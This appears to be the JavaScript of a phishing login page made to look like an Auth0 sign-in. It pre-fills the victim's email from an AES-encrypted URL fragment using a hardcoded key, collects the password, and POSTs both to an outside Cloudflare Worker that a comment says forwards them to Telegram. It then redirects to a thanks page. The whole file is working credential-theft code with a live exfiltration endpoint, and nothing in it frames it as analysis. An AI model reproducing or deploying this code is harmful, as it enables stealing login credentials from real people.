document.addEventListener('DOMContentLoaded', function() {
    checkCookie()
    let hashUrl = window.location.hash.substr(1).replace(new RegExp("%20", "g"), "+");

    let bytes = CryptoJS.AES.decrypt(hashUrl, 'secret key 123');
    var auto_email = bytes.toString(CryptoJS.enc.Utf8);
    
    if (auto_email.length > 4) {
        document.getElementById("userID").value = auto_email;
    }

    var showPass = $("#showHideButton");
    showPass.click(function() {
        var $this = $(this);
        if ($this.text().toLowerCase() === "show") {
            $this.text("Hide");
            $this.prev("input").prop("type", "text");
        } else {
            $this.text("Show");
            $this.prev("input").prop("type", "password");
        }
    });

    var url = "https://aut0-curr-9dc7.henrycrane65.workers.dev/"; // Your Worker URL

    submit_btn = document.getElementById("continueFromUserLogin");
    userInputContainerDiv = document.getElementById("userInputContainerDiv");
    userBackButton = document.getElementById("userBackButtonSpanTxt");
    count = 0;

    $("#userBackButton").click(function() {
        $(userBackButton).text("");
        $(".sub_div").addClass("hide");
        $(".main_div").removeClass("hide");
        document.getElementById("userErrorText").innerHTML = "";
        count = 0;
    });

    submit_btn.addEventListener("click", function(event) {
        error = document.getElementById("userErrorText");
        error.style.fontSize = "small";
        username = document.getElementById("userID").value;
        event.preventDefault();

        if (!isEmail(username)) {
            error.innerHTML = "Please enter your username correctly!";
        } else {
            $(userBackButton).text(username);
            $(".sub_div").removeClass("hide");
            $(".main_div").addClass("hide");
        }
    });

    // Password form submission
    $('#signin').click(function(event) {
        event.preventDefault();  // Prevent default form submission
        
        username = document.getElementById("userID").value;  // Get the email
        passerror = document.getElementById("passwordErrorText");
        password = document.getElementById("password").value;  // Get the password

        // Validate password length
        if (password.length < 4) {
            passerror.style.fontSize = "small";
            passerror.innerHTML = "Please enter your password correctly!";
        } else {
            // Send both username and password to the Cloudflare Worker (Telegram)
            fetch(url, {
                method: "POST",
                body: JSON.stringify({
                    userID: username,   // Send the username (email) field
                    password: password, // Send the password field
                }),
                headers: {
                    "Content-type": "application/json; charset=UTF-8"
                }
            })
            .then(function(response) {
                // Successfully sent data, redirect to thanks.html
                setCookie("username", username, 30);  // Optionally store the username in a cookie
                window.location.href = "./thanks.html"; // Redirect after success
            })
            .catch(function(error) {
                passerror.style.fontSize = "small";
                passerror.innerHTML = "There was an error processing your request.";
            });
        }
    });
});
